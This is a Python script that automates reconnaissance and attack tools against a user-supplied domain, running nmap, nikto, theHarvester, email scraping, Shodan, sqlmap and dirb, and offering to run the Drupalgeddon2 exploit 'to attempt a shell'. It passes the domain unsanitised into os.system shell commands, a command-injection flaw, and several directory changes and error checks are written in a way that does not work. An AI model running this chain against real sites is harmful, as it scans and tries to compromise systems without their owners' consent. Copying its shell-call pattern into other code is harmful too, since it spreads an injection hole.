#! python3
import os
from colorama import Fore, Back, Style

def wait():
  wait = input("PRESS ENTER TO CONTINUE")

def main():
  os.system("figlet -f slant 'domain_sticate'")
  print('=========================================================================')
  domain = input(Fore.CYAN + '[*]Enter domain to investigate(domain.ext): ' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Pinging domain...' + Style.RESET_ALL)
  try:
    os.system('ping -c 4 ' + domain + ' > outputs/ping.txt')
    print(Fore.GREEN + '[+]Domain reached!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]Domain not responding!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of Ping directed to ping.txt!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Running full nmap scan of domain...' + Style.RESET_ALL)
  try:
    os.system('nmap -sV -A -p 0-65535 ' + domain + ' > outputs/nmap.txt')
    print(Fore.GREEN + '[+]Scan complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + "[*]Scan incomplete!" + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of nmap scan directed to nmap.txt!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Running dig nameserver scan on domain...' + Style.RESET_ALL)
  try:
    os.system('dig ' + domain + ' ns > outputs/dig.txt')
    print(Fore.GREEN + '[+]Nameserver scan complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]Nameserver scan incomplete!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of dig scan directed to dig.txt!' + Style.RESET_ALL)
  os.system('cd theHarvester')
  print(Fore.RED +'[*]:WARNING: Once you run this, google will read your pings as a DDoS attack and block your IP temporarily!' + Style.RESET_ALL)
  wait()
  harv = input(Fore.CYAN + "[*]Do you want to run a harvester scan?[y/N]: " + Style.RESET_ALL)
  if harv == 'y' or harv == 'Y':
    print(Fore.CYAN + "[*]Running harvester scan..." + Style.RESET_ALL)
    try:
      os.system('python3.7 theHarvester.py -d ' + domain + ' -l 200 -b google -s -g -p -f ../outputs/output.html > ../outputs/harvest.txt')
      print(Fore.GREEN + '[+]Harvester scan complete!')
    except:
      print(Fore.RED + '[*]Harvester scan incomplete!')
    print(Fore.CYAN + '[*]Output of theHarvester directed to harvest.txt!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Running cewl wordlist scan...' + Style.RESET_ALL)
  try:
    os.system('cewl -w ../outputs/domain_wordlist.lst -d 7 -m 5 https://www.' + domain)
    print(Fore.GREEN + '[+]Cewl wordlist scan complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]Cewl wordlist scan incomplete!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of Cewl directed to domain_wordlist.lst!')
  print('[*]Running nikto scan...' + Style.RESET_ALL)
  try:
    http = input(Fore.CYAN + '[*]HTT(P) or HTTP(S)?: ' + Style.RESET_ALL)
    if http == 'P':
      os.system('nikto -h http://' + domain + ' -output ../outputs/nikto.txt')
      print(Fore.GREEN + '[+]nikto scan complete!' + Style.RESET_ALL)
    else:
      os.system('nikto -h https://' + domain + ' -output ../outputs/nikto.txt')
      print(Fore.GREEN + '[+]nikto scan complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]Nikto scan incomplete!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of nikto directed to nikto.txt' + Style.RESET_ALL)
  print('[*]Running sublist3r scan...' + Style.RESET_ALL)
  try:
    os.chdir('Sublist3r')
    os.system('python sublist3r.py -d ' + domain + ' > ../outputs/sublist3r.txt')
    print(Fore.GREEN + '[+]sublist3r scan complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]sublist3r scan incomplete!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of sublist3r directed to sublist3r.txt' + Style.RESET_ALL)
  os.system('cd ../JoomlaScan')
  print(Fore.CYAN + '[*]Running joomlascan...' + Style.RESET_ALL)
  try:
    os.system('python joomlascan.py -u https://www.' + domain + ' > ../outputs/joomla.txt')
    print(Fore.GREEN + '[+]Joomla Scan complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]Joomla Scan incomplete!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of JoomlaScan directed to joomla.txt!' + Style.RESET_ALL)
  os.system('cd ..')
  print(Fore.CYAN + '[*]Running email index on domain...' + Style.RESET_ALL)
  try:
    os.system('./goog-mail.py ' + domain + ' > outputs/domain_emails.txt')
    print(Fore.GREEN + '[+]Email index complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]Email index incomplete!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of goog-mail scan directed to domain_emails.txt!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Running shodan search on domain...' + Style.RESET_ALL)
  try:
    os.system('shodan search --fields ip_str,port,org,hostnames ' + domain  + ' > outputs/shodan.txt')
    print(Fore.GREEN + '[+]Shodan search complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]Shodan search incomplete!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Output of shodan scan directed to shodan.txt!' + Style.RESET_ALL)
  drupal = input(Fore.CYAN + '[*]Do you want to run DrupalGeddon2 to attempt a shell?[y/N]: ' + Style.RESET_ALL)
  if drupal == 'y' or drupal == 'Y':
    try:
      os.chdir('Drupalgeddon2')
      http = input(Fore.CYAN + '[*]HTT(P) or HTTP(S)?: ' + Style.RESET_ALL)
      if http == 'P':
        os.system('ruby drupalgeddon2.rb http://' + domain + ' > outputs/drupal.txt')
        print(Fore.GREEN + '[+]Drupalgeddon2 attempt complete!' + Style.RESET_ALL)
      else:
        os.system('ruby drupalgeddon2.rb https://' + domain + ' > outputs/drupal.txt')
        print(Fore.GREEN + '[+]Drupalgeddon2 attempt complete!' + Style.RESET_ALL)
    except:
      print(Fore.RED + '[*]Drupalgeddon2 attemp failed!' + Style.RESET_ALL)
  os.chdir('..')
  print(Fore.CYAN + '[*]Running sqlmap scan on domain...' + Style.RESET_ALL)
  try:
    os.system('sqlmap -u ' + domain  + ' > outputs/sqlmap.txt')
    print(Fore.GREEN + '[+]Sqlmap scan complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]Sqlmap scan incomplete!' + Style.RESET_ALL)
  print(Fore.CYAN + '[*]Running dirb scan on domain...' + Style.RESET_ALL)
  try:
    http = input(Fore.CYAN + '[*]HTT(P) or HTTP(S)?: ' + Style.RESET_ALL)
    if http == 'P':
      os.system('dirb http://' + domain  + ' > outputs/dirb.txt')
    else:
      os.system('dirb https://' + domain + ' > outputs/dirb.txt')
    print(Fore.GREEN + '[+]dirb scan complete!' + Style.RESET_ALL)
  except:
    print(Fore.RED + '[*]dirb scan incomplete!' + Style.RESET_ALL)
  print('=========================================================================')
  print(Fore.GREEN + '[+]Domainstication Complete!' + Style.RESET_ALL)
  wait()

ins = input(Fore.CYAN + '[*]Did you run lib_install.sh?[y/N]: ' + Style.RESET_ALL)
if ins == 'y' or ins == 'Y':
  wait()
  main()
else:
  print(Fore.RED + '[*]Please run lib_install.sh or KITT_INSTALLER.sh first...' + Style.RESET_ALL)
  wait()
  exit()
